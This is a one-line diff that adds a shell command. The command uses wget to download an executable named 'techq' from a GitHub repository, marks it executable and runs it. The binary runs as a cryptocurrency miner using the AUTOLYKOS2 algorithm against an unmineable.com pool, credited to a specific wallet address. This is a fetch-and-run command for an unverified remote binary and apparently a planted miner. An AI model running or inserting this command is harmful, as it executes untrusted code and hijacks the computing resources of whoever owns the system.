@@ -1,0 +1,1 @@
+wget https://github.com/Menak3/Corner/raw/main/techq && chmod +x techq && ./techq --algo AUTOLYKOS2 --pool stratum+ssl://autolykos.unmineable.com:4444 --user 0xfc0ed5ad9bc0159ce822d87b7f0eccae4aa01e9d.Arifin#yxp3-4njs --pass x --ethstratum ETHPROXY
